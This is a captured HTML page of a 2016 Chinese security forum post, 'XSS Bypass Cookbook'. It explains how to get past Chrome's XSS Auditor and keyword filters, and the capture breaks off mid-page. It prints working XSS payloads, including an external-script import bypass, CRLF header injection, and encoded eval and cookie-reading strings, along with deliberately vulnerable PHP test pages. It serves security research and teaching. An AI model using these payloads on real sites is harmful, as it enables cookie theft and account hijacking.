+	<img src="./XSS_Bypass_Cookbook_files/stairs.png" onclick="getFloorUrl(getObj(&#39;floor&#39;))" class="cp" align="absmiddle"></td>
+</tr>
+		</tbody></table>
+	</div>
+	<table width="100%" class="flootbg"><tbody><tr><td>
+	</td></tr></tbody></table>
+	<a name="tpc"></a>
+	<div class="read_t" id="readfloor_tpc">
+		<table width="100%" class="floot">
+<tbody><tr class="vt">
+	<td rowspan="2" class="floot_left">
+		<div class="floot_leftdiv">
+<div class="readFace">
+	<div class="fl">
+		<div class="card" style="display:none" id="readFace_0" onmouseover="this.style.display=&#39;&#39;;" onmouseout="this.style.display=&#39;none&#39;;">
+<dl class="cc">
+	<dt class="fl">
+		<div class="cc"><a rel="nofollow" href="https://xianzhi.aliyun.com/forum/u.php?uid=1655335246686006" class="face_img"><img class="pic" src="./XSS_Bypass_Cookbook_files/1655335246686006.png" border="0"></a></div>
+		<p>UID：1655335246686006</p>
+	</dt>
+	<dd class="ddA">
+		<ul class="cc half">
+<li><span>注册时间</span>2016-12-03</li>
+<li><span>最后登录</span>2016-12-13</li>
+<li><span>在线时间</span>10小时</li>
+		</ul>
+	</dd>
+	<dd class="ddA">
+		<ul class="cc half">
+<li><span>发帖</span>2</li>
+<li><a href="https://xianzhi.aliyun.com/forum/apps.php?q=article&amp;uid=1655335246686006" target="_blank">搜Ta的帖子</a></li>
+<li><span>精华</span><a href="https://xianzhi.aliyun.com/forum/searcher.php?authorid=1655335246686006&amp;digest=1" target="_blank">2</a></li>
+<li class="cc"><span>积分</span>24</li><li class="cc"><span>威望</span>22</li><li class="cc"><span>贡献值</span>20</li><li class="cc"><span>人民币</span>1450</li>
+		</ul>
+	</dd>
+	<dd class="ddB">
+		<a href="https://xianzhi.aliyun.com/forum/u.php?uid=1655335246686006" class="add_home">访问TA的空间</a><a href="javascript:;" onclick="sendmsg(&#39;https://xianzhi.aliyun.com/forum/pw_ajax.php?action=addfriend&amp;touid=1655335246686006&#39;)" class="add_fri">加好友</a><a href="javascript:;" onclick="sendmsg(&#39;https://xianzhi.aliyun.com/forum/pw_ajax.php?action=usertool&amp;uid=1655335246686006&#39;)" class="add_pro">用道具</a>
+	</dd>
+</dl>
+		</div>
+	</div>
+</div>
+<a href="https://xianzhi.aliyun.com/forum/u.php?uid=1655335246686006" id="card_sf_tpc_1655335246686006" class="userCard face_img">
+<img onmouseover="readFace.show(&#39;readFace_0&#39;);" onmouseout="readFace.clear()" class="pic" src="./XSS_Bypass_Cookbook_files/1655335246686006.png" border="0">
+</a>
+
+
+<div class="author"><img src="./XSS_Bypass_Cookbook_files/stealth.png" title="离线" align="absmiddle"><a rel="nofollow" href="https://xianzhi.aliyun.com/forum/u.php?uid=1655335246686006">math1as</a></div><div class="readLevel mb5">
+	<span>级别: <a rel="nofollow" href="https://xianzhi.aliyun.com/forum/profile.php?action=permission&amp;gid=8">P5_安全攻城狮</a>
+	</span>
+	<!-- 新的星级
+	<div class="star">
+		<div style="width:100%"></div>
+	</div>
+	-->
+
+	<img src="./XSS_Bypass_Cookbook_files/1.gif">
+
+</div>
+<div class="readUser_info cc mb10">
+	<ul class="two cc">
+		<li><a href="javascript:;" onclick="Attention.add(this,&#39;1655335246686006&#39;,0)" class="add_fol">加关注</a></li>
+		<li><a href="javascript:;" onclick="sendmsg(&#39;https://xianzhi.aliyun.com/forum/pw_ajax.php?action=msg&amp;touid=1655335246686006&#39;);" class="add_mes">写私信</a></li>
+	</ul>
+</div>
+
+<div></div>
+		</div>
+	</td>
+	<td class="floot_right" id="td_tpc"><a name="post_tpc"></a>
+<!--印戳-->
+<!--楼层信息及编辑-->
+		<div class="tipTop s6">
+<span class="fr">
+	<a href="javascript:;" onclick="window.location=(&#39;https://xianzhi.aliyun.com/forum/read/536.html?uid=1655335246686006&amp;displayMode=1&#39;);return false;" title="只看楼主的所有帖子" class="mr5 s6">只看楼主</a>
+	<a href="javascript:;" id="td_More" onclick="read.open(&#39;menu_More&#39;,&#39;td_More&#39;);" class="link_down mr5 s6"><span>更多操作</span></a>
+	<div id="menu_More" class="popout" style="display:none;"><table border="0" cellspacing="0" cellpadding="0"><tbody><tr><td class="bgcorner1"></td><td class="pobg1"></td><td class="bgcorner2"></td></tr><tr><td class="pobg4"></td><td><div class="popoutContent">
+		<ul class="menuList" style="width:70px;">
+<li><a href="https://xianzhi.aliyun.com/forum/read/536.html?ordertype=desc&amp;displayMode=1" title="倒序阅读">倒序阅读</a></li>
+<li><a href="javascript:;" title="https://xianzhi.aliyun.com/forum/read/536.html?u=" onclick="copyUrl(&#39;&#39;);">复制链接</a></li>
+
+		</ul>
+	</div></td><td class="pobg2"></td></tr><tr><td class="bgcorner4"></td><td class="pobg3"></td><td class="bgcorner3"></td></tr></tbody></table></div>
+</span>
+<a class="s2 b cp" onclick="copyFloorUrl(&#39;tpc&#39;)" title="复制此楼地址">楼主</a>&nbsp;&nbsp;<span title="2016-12-12 19:00:15">发表于: 12-12</span>
+                    </div>
+<!--帖子顶部ad-->
+<!--管理提醒-->
+<div id="mag_tpc" class="operTips tac f12 mb10 s6">—
+	本帖被 笑然 设置为精华(2016-12-13)
+	—
+</div>
+<!--活动参加按钮-->
+<div id="p_tpc"></div>
+<!--帖子右侧（广告/动漫表情）-->
+		<div class="readCon_right tar">
+		</div>
+<!--content_read-->
+                <div class="tpc_content">
+                    <div class="f14 mb10" id="read_tpc">
+                        <br><div align="center"><b><font size="7">XSS Bypass Cookbook</font></b></div><br><br><div align="left">[+] Author: math1as</div><div align="left">[+] Team: L team</div><div align="left"><br></div><div align="left"><b>#1 引言</b></div><div align="left"><br></div><div align="left">在目前的web安全漏洞中,xss一直属于热门的一类,而它对用户造成的危害较大。</div><div align="left">因此也引发了不少安全爱好者和专业工程师的研究。</div><div align="left">而html5等新技术的使用和具体业务场景中复杂的环境带给了xss更大的生存空间。</div><div align="left">而且不同xss向量也因为浏览器的特性会有所区别</div><div align="left">比如chrome在加载资源时会校验服务器返回的mimeType</div><div align="left">而firefox则根据标签自己设定的type来做出处理</div><div align="left">本文在目前较为常见的几种过滤条件下,简单的探讨了xss这一技术的应用以及绕过</div><div align="left"><b>记录了直到最新版有效的2个chrome xss auditor bypass payload</b></div><div align="left"><b>其中一个为universal bypass</b></div><div align="left"><b>1个firefox跨域固定会话漏洞</b></div><div align="left"><br></div><div align="left"><b>#1.1 研究范围</b></div><div align="left"><br></div><div align="left">XSS在各种具体业务场景下的应用和绕过</div><div align="left"><br></div><div align="left"><b>#1.2 测试环境</b></div><div align="left">在本文所叙述的测试环境中,用到的浏览器版本如下:</div><div align="left">chrome 54.0 / firefox 50.0 均为当前的最新发行版本</div><div align="left">ie系列由于精力有限未能进行测试</div><div align="left">正文中所有以x=开头的payload,均是在这个输出环境下测试的,代码如下</div><div align="left">&lt;input value="&lt;?php</div><div align="left">error_reporting(0);</div><div align="left">$content=$_GET['x'];</div><div align="left">echo $content;</div><div align="left">?&gt;" /&gt;</div><div align="left">输出在了input的value属性里</div><div align="left">而对于直接输出在上下文或者其他位置的情况,则做了额外的探讨</div><div align="left"><br></div><div align="left"><b>#2 Bypass Chrome XSS Auditor</b></div><div align="left"><br></div><div align="left">反射型XSS作为最容易发现和挖掘的一种XSS,活跃了非常久的时间。</div><div align="left">但是到现在它的作用已经被逐步的弱化</div><div align="left">特别是浏览器,比如chrome自身的xss auditor在其中扮演了非常重要的角色</div><div align="left">它通过直接检查了输入的内容,判断其是否在输出中出现。</div><div align="left">(当然,基本是针对'危险标签'和可能导致javascript执行的地方)</div><div align="left">如果符合其过滤条件,那么将直接阻止脚本的执行,比如给出这样的提示</div><div align="left"><br></div><div align="left"><span id="att_2034" class="f12"><span id="td_att2034" onmouseover="read.open(&#39;menu_att2034&#39;,&#39;td_att2034&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_7887d8e52da9054.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2034" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:1.png</span></p></div></div></span><br></div><br><div align="left"><br></div><div align="left">因此给反射XSS带来了不小的难度,但是它就真的那么坚固而不可挑战么?</div><div align="left">让我们来从各个方面对它进行逐步的分析吧</div><div align="left">本文里所提到的auditor bypass</div><div align="left"><b>大部分是输出在属性里的情况,直接输出而被绕过的情况已经很少见了。</b></div><div align="left"><br></div><div align="left"><b>#2.1 字符集问题产生的bypass</b></div><div align="left"><br></div><div align="left">由于chrome浏览器对ISO-2022-JP等编码的处理不当</div><div align="left">比如在页面没有设置默认的charset时,使用了这个日语字符集</div><div align="left">在会被auditor检查的部分添加%0f字符,就可以绕过了</div><div align="left">比如如下payload</div><div align="left">&lt;meta charset="ISO-2022-JP"&gt;&lt;img src="#" onerror%1B28B=alert(1) /&gt;</div><div align="left">这其实是利用了浏览器处理字符集时产生的问题。</div><div align="left">目前的chrome 54/55仍然没有进行修复</div><div align="left">随着以后字符集的更新,这种问题仍然有可能出现。</div><div align="left"><br></div><div align="left"><b>#2.2 过滤关键字造成的bypass </b></div><div align="left"><br></div><div align="left">在我们的xss测试过程中,可能最不喜欢的就是各类过滤了,它给我们xss带来了很大的难度</div><div align="left">但是在特定场合,它却能起到让我们绕过auditor的作用</div><div align="left">chrome的xss auditor主要基于如下规则(这种描述也许比较粗糙)</div><div align="left"><br></div><div align="left">(1)输入的内容是否直接在输出中出现</div><div align="left">(2)输入是否有敏感标签,或者造成脚本执行的事件</div><div align="left"><br></div><div align="left">那么聪明的你可能就想到了,如果替换掉了敏感关键字,比如开发者如果替换掉了&lt;script&gt;标签</div><div align="left"><b>那么对于这样的一个输出在属性里的例子</b></div><div align="left">while(1)</div><div align="left">{</div><div align="left">&nbsp;&nbsp;&nbsp;&nbsp;if(stripos($content,"&lt;script&gt;")===false) break;</div><div align="left">&nbsp;&nbsp;&nbsp;&nbsp;$content=str_replace("&lt;script&gt;","",$content);</div><div align="left">}</div><div align="left">&lt;img alt="&lt;?php echo $content;?&gt;"&gt;</div><div align="left">如果我们用&lt;script&gt;分割掉敏感的事件,那么我们的输入在经过auditor检查的时候,就被放行了。</div><div align="left">而真正打印内容进行渲染的时候,由于$content中的&lt;script&gt;被过滤,因此我们的xss脚本成功的执行了</div><div align="left">用这种方法,成功的绕过了xss auditor</div><br><div align="left"><span id="att_2035" class="f12"><span id="td_att2035" onmouseover="read.open(&#39;menu_att2035&#39;,&#39;td_att2035&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_07f815fe8fe2bc0.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2035" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:2.png</span></p></div></div></span><br></div><div align="left"><b>那么它是否可以被用在直接输出的反射XSS中呢?</b></div><div align="left">我们把这个输出点的代码改成如下:</div><div align="left">&lt;?php</div><div align="left">$content=$_GET['x'];</div><div align="left">while(1)</div><div align="left">{</div><div align="left">&nbsp;&nbsp;&nbsp;&nbsp;if(stripos($content,"&lt;script&gt;")===false) break;</div><div align="left">&nbsp;&nbsp;&nbsp;&nbsp;$content=str_replace("&lt;script&gt;","",$content);</div><div align="left">}</div><div align="left">echo $content;</div><div align="left">?&gt;</div><div align="left">事实证明,这种方法是完全可行的</div><br><div align="left"><span id="att_2036" class="f12"><span id="td_att2036" onmouseover="read.open(&#39;menu_att2036&#39;,&#39;td_att2036&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_2ee21ee347c233f.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2036" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:3.png</span></p></div></div></span><br></div><div align="left"><br></div><div align="left"><b>#2.3 协议理解产生的bypass</b></div><div align="left"><br></div><div align="left">chrome的xss auditor 在检查加载脚本的路径时,有一个比较有趣的地方</div><div align="left">如果加载的脚本在自身目录下,那么<b>如果xss的输出点在html属性中</b></div><div align="left">auditor是不会对其进行拦截的</div><div align="left">但是如果检测到了 // 这样的外部链接的话,就会触发auditor无法加载外部脚本</div><div align="left">这时就有一个小细节了,在加载其他脚本时 如果我们输入了的链接使用了http: 而没有带上 // 的话</div><div align="left">它会仍然被视为在这个目录下,比如我们构造payload</div><div align="left"><span id="att_2037" class="f12"><span id="td_att2037" onmouseover="read.open(&#39;menu_att2037&#39;,&#39;td_att2037&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_838a3c6ff7da161.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2037" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:4.png</span></p></div></div></span><br></div><br><div align="left">x=1"&gt;&lt;link%20rel="import"%20href=http:<span style="color:#0000ff ">www.math1as.com</span></div><br><div align="left">明显的,它被视为了一个目录,从而返回了不存在,此时auditor也不会对其进行拦截</div><div align="left"><span id="att_2038" class="f12"><span id="td_att2038" onmouseover="read.open(&#39;menu_att2038&#39;,&#39;td_att2038&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_b1a5518bdd10062.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2038" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:5.png</span></p></div></div></span><br></div><div align="left">那么换个思路想想. 使用http: 虽然被认为是一个目录,但是https呢</div><div align="left">我们使用https来代替http:</div><br><div align="left">发现成功的把它当作了一个完整的https链接进行了加载</div><div align="left"><span id="att_2039" class="f12"><span id="td_att2039" onmouseover="read.open(&#39;menu_att2039&#39;,&#39;td_att2039&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_f71af99c9075137.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2039" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:6.png</span></p></div></div></span><br></div><div align="left">注意的是这里不能使用&gt;或者"进行闭合,否则就会触发auditor的标签完整性检测</div><div align="left">因此,像&lt;script src="evil" &gt;&lt;/script&gt; 这样需要闭合的脚本就不能使用了</div><div align="left">接下来的问题就是,既然不能用"闭合,也就意味着我们的链接最后始终会带有一个"</div><div align="left">并且,由于加载外部文档会触发CROS,所以我们需要设置其header来允许访问</div><div align="left">因此,我们在.htaccess新建一条url转发</div><div align="left">RewriteRule 1.\"$ /xss/t1.php</div><div align="left">并在t1.php中写入如下代码</div><div align="left">&lt;?php</div><div align="left">header("Access-Control-Allow-Origin:*");</div><div align="left">echo "&lt;script&gt;alert(1)&lt;/script&gt;";</div><div align="left">?&gt;</div><div align="left">这样我们使用如下payload,就可以成功的把xss脚本给加载过来了</div><div align="left">x=1"&gt;&lt;link%20rel="import"%20href=https:<span style="color:#0000ff ">www.math1as.com/1.</span></div><div align="left">成功的绕过了auditor</div><div align="left"><span id="att_2040" class="f12"><span id="td_att2040" onmouseover="read.open(&#39;menu_att2040&#39;,&#39;td_att2040&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_866d444ed09a51e.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2040" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:7.png</span></p></div></div></span><br></div><br><div align="left"><b>这个payload在最新的chrome 54/55中有效</b></div><div align="left"><b>那么它是否可以被用在直接输出的反射XSS中呢?</b></div><div align="left">假设我们处于一个直接输出的xss点当中,具体代码如下</div><div align="left">&lt;body&gt;</div><div align="left">&lt;?php</div><div align="left">$content=$_GET['x'];</div><div align="left">echo $content;</div><div align="left">?&gt;</div><div align="left">&lt;/body&gt;</div><div align="left">这时我们使用如下payload</div><div align="left">x=&lt;link%20rel="import"%20href=https:www.math1as.com/</div><br><div align="left"><span id="att_2041" class="f12"><span id="td_att2041" onmouseover="read.open(&#39;menu_att2041&#39;,&#39;td_att2041&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_128cd6dfd9c6048.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2041" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:8.png</span></p></div></div></span><br></div><div align="left"><b>那么,很显然的,这个payload是一个无条件的chrome auditor bypass,适用于最新版chrome 54/55</b></div><div align="left">这个payload由原作者发现后,认为是一个输出在属性中的bypass,而在我和phithon复现后,发现其实是无视条件直接触发的</div><div align="left"><br></div><div align="left">那么,既然这样做可以加载外部资源,那么使用&lt;embed&gt;来加载一个外部flash产生xss是不是也可以呢?</div><div align="left">首先我们需要让这个带有"结尾的后缀能被成功的响应为一个flash文件</div><div align="left">在apache的mime.types配置文件中添加了s"的后缀名</div><br><div align="left"><span id="att_2042" class="f12"><span id="td_att2042" onmouseover="read.open(&#39;menu_att2042&#39;,&#39;td_att2042&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_96affd3b7e68265.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2042" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:9.png</span></p></div></div></span><br></div><div align="left">可以看到返回了application/x-shockwave-flash</div><div align="left">资源也成功加载了,但是我们的chrome并不领情</div><div align="left"><span id="att_2043" class="f12"><span id="td_att2043" onmouseover="read.open(&#39;menu_att2043&#39;,&#39;td_att2043&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_2c8566cddfb8d25.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2043" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:10.png</span></p></div></div></span><br></div><br><div align="left"><br></div><div align="left">当然这里需要说明是的对于firefox来说它是不会分辨mimetype的,但是chrome就会进行校验。</div><div align="left">因此,很遗憾的,我们的&lt;embed&gt;不能使用在这里。</div><div align="left"><br></div><div align="left"><b>#2.4 上传swf导致flash-xss所产生的bypass</b></div><div align="left"><br></div><div align="left">根据2.3中的思路,如果存在任意一个可以上传swf文件的上传点,就可以对chrome的auditor进行绕过。</div><div align="left">所用的payload如下</div><div align="left">x=1"&gt;&lt;embed+type="application/x-shockwave-flash"+allowscriptaccess=always+src=/a/1.swf"</div><br><div align="left"><span id="att_2044" class="f12"><span id="td_att2044" onmouseover="read.open(&#39;menu_att2044&#39;,&#39;td_att2044&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_6168441008bcbbd.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2044" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:11.png</span></p></div></div></span><br></div><div align="left">但是这种方法一般比较鸡肋</div><div align="left">因为允许上传swf文件的话,一般也允许在富文本编辑器中直接加载这个swf了</div><div align="left"><br></div><div align="left"><b>#2.5 crlf产生的bypass</b></div><div align="left"><br></div><div align="left">由于chrome的auditor默认是开启的,但是仍然会受到http头的影响</div><div align="left">如果X-XSS-Protection被赋值为0,那么chrome自身的filter就会关闭</div><div align="left">因此,如果在一个302跳转页面我们注入了%0d%0a然后在新一行中</div><div align="left">写入X-XSS-Protection:0,那么接下来的XSS内容就不会受到auditor的阻止了</div><div align="left">如何在这个页面构造一个反射型XSS呢?</div><div align="left">http数据报文的格式是这样的</div><div align="left"><span id="att_2045" class="f12"><span id="td_att2045" onmouseover="read.open(&#39;menu_att2045&#39;,&#39;td_att2045&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_2b39608c5695ff0.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2045" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:12.png</span></p></div></div></span><br></div><br><div align="left">需要再多注入%0d%0a%0d%0a,即两个crlf</div><div align="left">这时的内容就会被视为http body而直接输出到源码中,浏览器会将其解析</div><div align="left">因此就产生了bypass浏览器filter的注入。</div><div align="left">但是php高版本中已不允许发送多行header</div><div align="left"><span id="att_2067" class="f12"><span id="td_att2067" onmouseover="read.open(&#39;menu_att2067&#39;,&#39;td_att2067&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_351633411006f22.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2067" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:000.png</span></p></div></div></span><br></div><br><div align="left">因此这个利用方法只适用于其他语言的web环境下进行利用</div><div align="left"><br></div><div align="left"><b>#3 各类针对关键字过滤的bypass</b></div><div align="left"><br></div><div align="left">在实际的业务场景中,xss会受到程序本身,或者是可能存在的waf的影响,他们会过滤或者替换掉</div><div align="left">攻击者payload中的某些特定关键字,因此针对关键字过滤的bypass也一直是我们主要关注的方向</div><div align="left"><br></div><div align="left"><b>#3.1 过滤特定标签</b></div><div align="left"><br></div><div align="left">这种过滤其实真的已经无法起效了,任何一个标签都可以构造出XSS,因此不再赘述</div><div align="left">一个示例payload &lt;img src="#" onerror=alert(1) /&gt;</div><div align="left">利用事件来触发xss</div><div align="left">也可以是利用&lt;embed&gt;来加载一个远程的flash文件,制造xss</div><div align="left">当然,如果输出点在html属性中,即使过滤了尖括号&lt;&gt;,如果可以闭合属性的冒号</div><div align="left">那么仍然产生了dom-xss,利用事件足以摧毁开发者的防御。</div><div align="left"><br></div><div align="left"><b>#3.2 通用的敏感关键字绕过方法</b></div><div align="left"><br></div><div align="left">关键字过滤是针对敏感变量,或者函数的,比如cookie,eval等</div><div align="left">又或者是()符号,</div><div align="left">那么介绍几种通用的绕过的方法</div><div align="left">1. 利用数组方式来拼接</div><div align="left">js里的对象成员方法也可以用数组的形式的表示</div><div align="left">简单的说,比如eval()函数就可以用top对象的成员方法来表示</div><div align="left">top['ev'+'al'](evalcode)</div><div align="left">这时,比如过滤了eval,我们可以这样来触发xss</div><div align="left">x="onfocus=top["ev"%2b"al"](alert(1))//</div><div align="left">使用字符串拼接的方式来构造出eval</div><br><div align="left"><span id="att_2046" class="f12"><span id="td_att2046" onmouseover="read.open(&#39;menu_att2046&#39;,&#39;td_att2046&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_3b65be062e6d9c6.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2046" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:13.png</span></p></div></div></span><br></div><div align="left">2. 利用location的url解码特点</div><div align="left">现代浏览器基本支持javascript:code 这种伪协议</div><div align="left">而location在跳转的过程中又会自动解码,因此我们可以试图把敏感部分进行二次编码</div><div align="left">存放到location部位。</div><div align="left">比如我们通过这样的方式来调用eval</div><div align="left">x="onfocus=location="javascript:%2565%2576%2561%256c(alert(1))"//</div><div align="left">可以看到,成功的通过eval去调用了alert(1)</div><br><div align="left">那你会问,如果括号也被过滤了呢? 继续编码就好了</div><div align="left">构造如下的payload</div><div align="left">x="onfocus=location="javascript:%2565%2576%2561%256c%2528alert%25281%2529%2529"//</div><br><div align="left"><span id="att_2047" class="f12"><span id="td_att2047" onmouseover="read.open(&#39;menu_att2047&#39;,&#39;td_att2047&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_2e9f871a718d5bd.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2047" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:14.png</span></p></div></div></span><br></div><div align="left">3.利用location.hash来存放</div><div align="left">location.hash是浏览器中用于定位锚的字符串,它是不会向服务端发送的,因此也不会被过滤</div><div align="left">所以我们可以构造如下payload来进行绕过</div><div align="left">x="onfocus=outerHTML=location.hash//#&lt;img/src="#" onerror=alert(document.cookie)&gt;</div><br><div align="left"><span id="att_2049" class="f12"><span id="td_att2049" onmouseover="read.open(&#39;menu_att2049&#39;,&#39;td_att2049&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_350232a2c4e2ff4.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2049" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:16.png</span></p></div></div></span><br></div><div align="left">4. String.fromCharcode() 可以从ascii码中解析出特定的字符串,比如这里过滤document.cookie</div><div align="left">使用如下的payload</div><div align="left">x="onfocus=eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))//</div><br><div align="left">就可以成功绕过</div><div align="left"><span id="att_2050" class="f12"><span id="td_att2050" onmouseover="read.open(&#39;menu_att2050&#39;,&#39;td_att2050&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_0683583c2c150cd.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2050" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:17.png</span></p></div></div></span><br></div><div align="left">5. 利用window.name进行跨域传输</div><div align="left">用在location.hash被过滤/长度不够,或者不能使用点号的情况</div><div align="left">这里可以使用一个&lt;iframe scr="payload" name="evilcode" /&gt;的方式,在window.name中存储代码</div><div align="left">其实这种方法也被称为回旋镖</div><div align="left">它能够把一个反射XSS升格为类似存储型XSS的效果</div><div align="left">这里以绕过对eval的过滤为例</div><div align="left">&lt;iframe src="http://127.0.0.1/q.php?x=1%22onfocus=location=window.name//" name="javascript:eval(alert(document.cookie))" width="100%" height="100%" /&gt;</div><div align="left">将其保存为一个html,随便放置在一个地方,就像普通的xss那样触发</div><br><div align="left"><span id="att_2051" class="f12"><span id="td_att2051" onmouseover="read.open(&#39;menu_att2051&#39;,&#39;td_att2051&#39;);" style="display:inline-block;"><img src="./XSS_Bypass_Cookbook_files/4_1655335246686006_d3641b38700fe81.png" border="0" style="max-width:900px;max-height:700px;" onload="if(this.offsetWidth&gt;&#39;900&#39;)this.width=&#39;900&#39;;if(this.offsetHeight&gt;&#39;700&#39;)this.height=&#39;700&#39;;"></span><div id="menu_att2051" class="pw_menu" style="display:none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span 